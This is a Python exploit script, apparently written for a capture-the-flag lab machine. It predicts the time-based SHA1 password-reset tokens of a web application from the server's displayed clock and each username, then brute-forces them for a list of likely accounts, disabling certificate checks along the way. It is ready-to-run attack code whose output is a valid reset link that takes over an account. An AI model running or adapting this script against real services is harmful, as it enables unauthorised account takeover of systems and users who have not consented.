import hashlib
import re
import requests

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Update with your target machine IP
url = 'http://<IP>:8080/'

usernames = [
    'administrator', 'admin', 'clocky_user',
    'jane', 'clarice', 'clocky'
]

def trigger_reset_and_get_time(username):
    # Trigger the password reset
    requests.post(url + 'forgot_password', data={'username': username}, verify=False)
    # Immediately grab the server time from the homepage
    resp = requests.get(url, verify=False)
    match = re.search(r'The current time is (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', resp.text)
    if match:
        return match.group(1)
    return None

def generate_tokens(username, timestamp):
    tokens = []
    for i in range(100):
        # Try all possible millisecond values (00 to 99)
        lnk = timestamp + '.' + format(i, '02') + ' . ' + username.upper()
        token = hashlib.sha1(lnk.encode('utf-8')).hexdigest()
        tokens.append(token)
    return tokens

def test_tokens(tokens):
    for token in tokens:
        resp = requests.get(url + 'password_reset?token=' + token, verify=False)
        if '<h2>Invalid token</h2>' not in resp.text:
            print(f'\n[+] Valid token found: {token}')
            return token
    return None

# Main loop
for user in usernames:
    print(f'[*] Trying username: {user}')
    timestamp = trigger_reset_and_get_time(user)
    if timestamp:
        print(f'    [-] Captured server time: {timestamp}')
        tokens = generate_tokens(user, timestamp)
        result = test_tokens(tokens)
        if result:
            print(f'[+] Success! Use this URL: {url}password_reset?token={result}')
            break
    else:
        print('    [-] Could not fetch timestamp from homepage.')
